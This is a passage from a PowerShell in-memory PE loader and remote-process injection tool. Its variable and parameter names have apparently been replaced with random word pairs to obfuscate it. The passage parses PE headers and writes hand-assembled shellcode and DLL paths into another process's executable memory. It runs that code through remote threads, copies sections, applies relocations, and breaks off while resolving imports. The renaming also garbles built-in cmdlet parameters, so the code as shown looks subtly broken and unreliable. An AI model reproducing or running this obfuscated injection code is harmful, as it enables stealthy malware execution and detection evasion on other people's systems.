			$CrosierFelt | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_NT_HEADERS -CampingArkite $AndhraDogtie
			$CrosierFelt | Add-Member -MemberType NoteProperty -CrenelsBatboys PE64Bit -CampingArkite $true
		}
		else
		{
			$FiscalFilmer = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DiffersAbactor, [Type]$BetteBryce.IMAGE_NT_HEADERS32)
			$CrosierFelt | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_NT_HEADERS -CampingArkite $FiscalFilmer
			$CrosierFelt | Add-Member -MemberType NoteProperty -CrenelsBatboys PE64Bit -CampingArkite $false
		}
		
		return $CrosierFelt
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$AnnieCapered,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$BetteBryce
		)
		
		$AmazuluGasking = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$DibbleCrimper = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($AnnieCapered.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($AnnieCapered, 0, $DibbleCrimper, $AnnieCapered.Length) | Out-Null
		
		#Get NtHeadersInfo
		$CrosierFelt = Get-ImageNtHeaders -BlinDefoam $DibbleCrimper -BetteBryce $BetteBryce
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'PE64Bit' -CampingArkite ($CrosierFelt.PE64Bit)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'OriginalImageBase' -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'SizeOfImage' -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'SizeOfHeaders' -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'DllCharacteristics' -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($DibbleCrimper)
		
		return $AmazuluGasking
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$BlinDefoam,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$BetteBryce,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$FunksGoric
		)
		
		if ($BlinDefoam -eq $null -or $BlinDefoam -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$AmazuluGasking = New-Object System.Object
		
		#Get NtHeaders information
		$CrosierFelt = Get-ImageNtHeaders -BlinDefoam $BlinDefoam -BetteBryce $BetteBryce
		
		#Build the PEInfo object
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys PEHandle -CampingArkite $BlinDefoam
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_NT_HEADERS -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys NtHeadersPtr -CampingArkite ($CrosierFelt.NtHeadersPtr)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys PE64Bit -CampingArkite ($CrosierFelt.PE64Bit)
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys 'SizeOfImage' -CampingArkite ($CrosierFelt.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($AmazuluGasking.PE64Bit -eq $true)
		{
			[IntPtr]$DronerHamadan = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_NT_HEADERS64)))
			$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys SectionHeaderPtr -CampingArkite $DronerHamadan
		}
		else
		{
			[IntPtr]$DronerHamadan = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_NT_HEADERS32)))
			$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys SectionHeaderPtr -CampingArkite $DronerHamadan
		}
		
		if (($CrosierFelt.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $FunksGoric.IMAGE_FILE_DLL) -eq $FunksGoric.IMAGE_FILE_DLL)
		{
			$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys FileType -CampingArkite 'DLL'
		}
		elseif (($CrosierFelt.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $FunksGoric.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $FunksGoric.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys FileType -CampingArkite 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $AmazuluGasking
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$BragsFennecs,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$AverilColorin
		)
		
		$BedungGrating = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$CyperusBroth = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($AverilColorin)
		$EnchaseGowned = [UIntPtr][UInt64]([UInt64]$CyperusBroth.Length + 1)
		$CatlikeGorge = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, $EnchaseGowned, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
		if ($CatlikeGorge -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$DriesGarrote = [UIntPtr]::Zero
		$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $CatlikeGorge, $AverilColorin, $EnchaseGowned, [Ref]$DriesGarrote)
		
		if ($FloodyBouton -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($EnchaseGowned -ne $DriesGarrote)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$CrotonGirded = $CrinkleChapati.GetModuleHandle.Invoke("kernel32.dll")
		$DenizenBidding = $CrinkleChapati.GetProcAddress.Invoke($CrotonGirded, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$BiggingCrooks = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($AmazuluGasking.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$AutopenCaviar = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, $EnchaseGowned, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
			if ($AutopenCaviar -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$BraysFusuma = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$EtapesChoosy = @(0x48, 0xba)
			$ErgalAerated = @(0xff, 0xd2, 0x48, 0xba)
			$DeposalBayou = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$FaradicGriffes = $BraysFusuma.Length + $EtapesChoosy.Length + $ErgalAerated.Length + $DeposalBayou.Length + ($BedungGrating * 3)
			$BaittleEpaule = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FaradicGriffes)
			$BandsawCrimes = $BaittleEpaule
			
			Write-BytesToMemory -BuffyGarbage $BraysFusuma -FinchedAronia $BaittleEpaule
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BraysFusuma.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($CatlikeGorge, $BaittleEpaule, $false)
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
			Write-BytesToMemory -BuffyGarbage $EtapesChoosy -FinchedAronia $BaittleEpaule
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($EtapesChoosy.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($DenizenBidding, $BaittleEpaule, $false)
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
			Write-BytesToMemory -BuffyGarbage $ErgalAerated -FinchedAronia $BaittleEpaule
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($ErgalAerated.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($AutopenCaviar, $BaittleEpaule, $false)
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
			Write-BytesToMemory -BuffyGarbage $DeposalBayou -FinchedAronia $BaittleEpaule
			$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($DeposalBayou.Length)

			
			$DuadsDaffier = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, [UIntPtr][UInt64]$FaradicGriffes, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_EXECUTE_READWRITE)
			if ($DuadsDaffier -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $DuadsDaffier, $BandsawCrimes, [UIntPtr][UInt64]$FaradicGriffes, [Ref]$DriesGarrote)
			if (($FloodyBouton -eq $false) -or ([UInt64]$DriesGarrote -ne [UInt64]$FaradicGriffes))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$CornrowBalm = Invoke-DingeBolivar -AmorousEscars $BragsFennecs -GloriaDivel $DuadsDaffier -CrinkleChapati $CrinkleChapati
			$CoelomFlukily = $CrinkleChapati.WaitForSingleObject.Invoke($CornrowBalm, 20000)
			if ($CoelomFlukily -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $AutopenCaviar, read this memory
			[IntPtr]$CuprousFalco = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BedungGrating)
			$CoelomFlukily = $CrinkleChapati.ReadProcessMemory.Invoke($BragsFennecs, $AutopenCaviar, $CuprousFalco, [UIntPtr][UInt64]$BedungGrating, [Ref]$DriesGarrote)
			if ($CoelomFlukily -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$BiggingCrooks = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CuprousFalco, [Type][IntPtr])

			$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $AutopenCaviar, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
			$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $DuadsDaffier, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$CornrowBalm = Invoke-DingeBolivar -AmorousEscars $BragsFennecs -GloriaDivel $DenizenBidding -ArgumentPtr $CatlikeGorge -CrinkleChapati $CrinkleChapati
			$CoelomFlukily = $CrinkleChapati.WaitForSingleObject.Invoke($CornrowBalm, 20000)
			if ($CoelomFlukily -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$FatihaAgname = 0
			$CoelomFlukily = $CrinkleChapati.GetExitCodeThread.Invoke($CornrowBalm, [Ref]$FatihaAgname)
			if (($CoelomFlukily -eq 0) -or ($FatihaAgname -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$BiggingCrooks = [IntPtr]$FatihaAgname
		}
		
		$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $CatlikeGorge, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
		
		return $BiggingCrooks
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$BragsFennecs,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$AvestaDroners,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$ChrysinChuppas
		)

		$BedungGrating = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$DaleyGeegaw = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ChrysinChuppas)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FoxbaneGreaves = [UIntPtr][UInt64]([UInt64]$ChrysinChuppas.Length + 1)
		$DreadlyBlore = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, $FoxbaneGreaves, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
		if ($DreadlyBlore -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$DriesGarrote = [UIntPtr]::Zero
		$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $DreadlyBlore, $DaleyGeegaw, $FoxbaneGreaves, [Ref]$DriesGarrote)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($DaleyGeegaw)
		if ($FloodyBouton -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FoxbaneGreaves -ne $DriesGarrote)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$CrotonGirded = $CrinkleChapati.GetModuleHandle.Invoke("kernel32.dll")
		$AcmesDisazo = $CrinkleChapati.GetProcAddress.Invoke($CrotonGirded, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$AiringBertram = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, [UInt64][UInt64]$BedungGrating, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
		if ($AiringBertram -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GalaxyBebog = @()
		if ($AmazuluGasking.PE64Bit -eq $true)
		{
			$HantlesAvenger = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$EngraftGirls = @(0x48, 0xba)
			$BedecksFluible = @(0x48, 0xb8)
			$DoowopDoer = @(0xff, 0xd0, 0x48, 0xb9)
			$DefalkEmbay = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$HantlesAvenger = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$EngraftGirls = @(0xb9)
			$BedecksFluible = @(0x51, 0x50, 0xb8)
			$DoowopDoer = @(0xff, 0xd0, 0xb9)
			$DefalkEmbay = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$FaradicGriffes = $HantlesAvenger.Length + $EngraftGirls.Length + $BedecksFluible.Length + $DoowopDoer.Length + $DefalkEmbay.Length + ($BedungGrating * 4)
		$BaittleEpaule = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FaradicGriffes)
		$BandsawCrimes = $BaittleEpaule
		
		Write-BytesToMemory -BuffyGarbage $HantlesAvenger -FinchedAronia $BaittleEpaule
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($HantlesAvenger.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($AvestaDroners, $BaittleEpaule, $false)
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
		Write-BytesToMemory -BuffyGarbage $EngraftGirls -FinchedAronia $BaittleEpaule
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($EngraftGirls.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($DreadlyBlore, $BaittleEpaule, $false)
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
		Write-BytesToMemory -BuffyGarbage $BedecksFluible -FinchedAronia $BaittleEpaule
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedecksFluible.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($AcmesDisazo, $BaittleEpaule, $false)
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
		Write-BytesToMemory -BuffyGarbage $DoowopDoer -FinchedAronia $BaittleEpaule
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($DoowopDoer.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($AiringBertram, $BaittleEpaule, $false)
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
		Write-BytesToMemory -BuffyGarbage $DefalkEmbay -FinchedAronia $BaittleEpaule
		$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($DefalkEmbay.Length)
		
		$DuadsDaffier = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, [UIntPtr][UInt64]$FaradicGriffes, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_EXECUTE_READWRITE)
		if ($DuadsDaffier -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $DuadsDaffier, $BandsawCrimes, [UIntPtr][UInt64]$FaradicGriffes, [Ref]$DriesGarrote)
		if (($FloodyBouton -eq $false) -or ([UInt64]$DriesGarrote -ne [UInt64]$FaradicGriffes))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$CornrowBalm = Invoke-DingeBolivar -AmorousEscars $BragsFennecs -GloriaDivel $DuadsDaffier -CrinkleChapati $CrinkleChapati
		$CoelomFlukily = $CrinkleChapati.WaitForSingleObject.Invoke($CornrowBalm, 20000)
		if ($CoelomFlukily -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $AiringBertram, read this memory
		[IntPtr]$CuprousFalco = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BedungGrating)
		$CoelomFlukily = $CrinkleChapati.ReadProcessMemory.Invoke($BragsFennecs, $AiringBertram, $CuprousFalco, [UIntPtr][UInt64]$BedungGrating, [Ref]$DriesGarrote)
		if (($CoelomFlukily -eq $false) -or ($DriesGarrote -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ByelawsFluters = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CuprousFalco, [Type][IntPtr])

		$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $DuadsDaffier, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
		$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $DreadlyBlore, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
		$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $AiringBertram, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
		
		return $ByelawsFluters
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$AnnieCapered,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$BetteBryce
		)
		
		for( $BopeepsGuessed = 0; $BopeepsGuessed -lt $AmazuluGasking.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $BopeepsGuessed++)
		{
			[IntPtr]$DronerHamadan = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.SectionHeaderPtr) ($BopeepsGuessed * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_SECTION_HEADER)))
			$CrossedGybe = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DronerHamadan, [Type]$BetteBryce.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$ChaukAditus = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$CrossedGybe.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$DrubsBassi = $CrossedGybe.SizeOfRawData

			if ($CrossedGybe.PointerToRawData -eq 0)
			{
				$DrubsBassi = 0
			}
			
			if ($DrubsBassi -gt $CrossedGybe.VirtualSize)
			{
				$DrubsBassi = $CrossedGybe.VirtualSize
			}
			
			if ($DrubsBassi -gt 0)
			{
				Test-MemoryRangeValid -GaumishFrabbit "Copy-Sections::MarshalCopy" -AmazuluGasking $AmazuluGasking -GloriaDivel $ChaukAditus -CotwistChoses $DrubsBassi | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($AnnieCapered, [Int32]$CrossedGybe.PointerToRawData, $ChaukAditus, $DrubsBassi)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($CrossedGybe.SizeOfRawData -lt $CrossedGybe.VirtualSize)
			{
				$GruntsDalasi = $CrossedGybe.VirtualSize - $DrubsBassi
				[IntPtr]$GloriaDivel = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$ChaukAditus) ([Int64]$DrubsBassi))
				Test-MemoryRangeValid -GaumishFrabbit "Copy-Sections::Memset" -AmazuluGasking $AmazuluGasking -GloriaDivel $GloriaDivel -CotwistChoses $GruntsDalasi | Out-Null
				$CrinkleChapati.memset.Invoke($GloriaDivel, 0, [IntPtr]$GruntsDalasi) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$ApsidesGuffaws,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$FunksGoric,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$BetteBryce
		)
		
		[Int64]$DepressBehalf = 0
		$GuitarsChilla = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$AnorakAggress = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($ApsidesGuffaws -eq [Int64]$AmazuluGasking.EffectivePEHandle) `
				-or ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($ApsidesGuffaws) ($AmazuluGasking.EffectivePEHandle)) -eq $true)
		{
			$DepressBehalf = Sub-SignedIntAsUnsigned ($ApsidesGuffaws) ($AmazuluGasking.EffectivePEHandle)
			$GuitarsChilla = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($AmazuluGasking.EffectivePEHandle) ($ApsidesGuffaws)) -eq $true)
		{
			$DepressBehalf = Sub-SignedIntAsUnsigned ($AmazuluGasking.EffectivePEHandle) ($ApsidesGuffaws)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$CeasedDadaism = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$ClewedAplanat = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CeasedDadaism, [Type]$BetteBryce.IMAGE_BASE_RELOCATION)

			if ($ClewedAplanat.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$BirthedFledged = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$ClewedAplanat.VirtualAddress))
			$DouserAcuity = ($ClewedAplanat.SizeOfBlock - $AnorakAggress) / 2

			#Loop through each relocation
			for($BopeepsGuessed = 0; $BopeepsGuessed -lt $DouserAcuity; $BopeepsGuessed++)
			{
				#Get info for this relocation
				$BlobberBateaux = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$CeasedDadaism) ([Int64]$AnorakAggress + (2 * $BopeepsGuessed)))
				[UInt16]$CarrotFender = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BlobberBateaux, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $BirthedFledged
				[UInt16]$CotheDrummer = $CarrotFender -band 0x0FFF
				[UInt16]$GaybineBoffs = $CarrotFender -band 0xF000
				for ($CrimpyAboma = 0; $CrimpyAboma -lt 12; $CrimpyAboma++)
				{
					$GaybineBoffs = [Math]::Floor($GaybineBoffs / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($GaybineBoffs -eq $FunksGoric.IMAGE_REL_BASED_HIGHLOW) `
						-or ($GaybineBoffs -eq $FunksGoric.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$DrenchDecagon = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BirthedFledged) ([Int64]$CotheDrummer))
					[IntPtr]$FinanceFulmar = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DrenchDecagon, [Type][IntPtr])
		
					if ($GuitarsChilla -eq $true)
					{
						[IntPtr]$FinanceFulmar = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$FinanceFulmar) ($DepressBehalf))
					}
					else
					{
						[IntPtr]$FinanceFulmar = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$FinanceFulmar) ($DepressBehalf))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($FinanceFulmar, $DrenchDecagon, $false) | Out-Null
				}
				elseif ($GaybineBoffs -ne $FunksGoric.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $GaybineBoffs, relocationinfo: $CarrotFender"
				}
			}
			
			$CeasedDadaism = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CeasedDadaism) ([Int64]$ClewedAplanat.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$BetteBryce,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$FunksGoric,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$BragsFennecs
		)
		
		$CovenCurling = $false
		if ($AmazuluGasking.PEHandle -ne $AmazuluGasking.EffectivePEHandle)
		{
			$CovenCurling = $true
		}
		
		if ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ErogenyBodying = Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$BroodyDraggy = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ErogenyBodying, [Type]$BetteBryce.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($BroodyDraggy.Characteristics -eq 0 `
						-and $BroodyDraggy.FirstThunk -eq 0 `
						-and $BroodyDraggy.ForwarderChain -eq 0 `
